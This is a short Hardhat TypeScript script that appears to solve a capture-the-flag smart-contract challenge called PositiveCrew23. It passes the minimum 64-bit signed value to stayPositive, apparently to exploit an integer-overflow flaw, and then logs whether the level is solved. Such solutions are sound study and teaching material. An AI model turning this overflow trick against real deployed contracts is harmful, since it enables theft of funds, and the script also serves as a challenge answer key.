import chalk from "chalk";
import { ethers } from "hardhat";
import { PositiveCrew23__factory, PositiveCrew23 } from "../../typechain";
import { log, initialize } from "../utils";


async function main() {
    let [positiveCrew23Contract, attacker] = await initialize<PositiveCrew23>(PositiveCrew23__factory);
    
    let tx = await positiveCrew23Contract.stayPositive("-0x8000000000000000");
    await tx.wait();
    log(`Is solved: ${chalk.yellow(await positiveCrew23Contract.solved())}`);
    
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});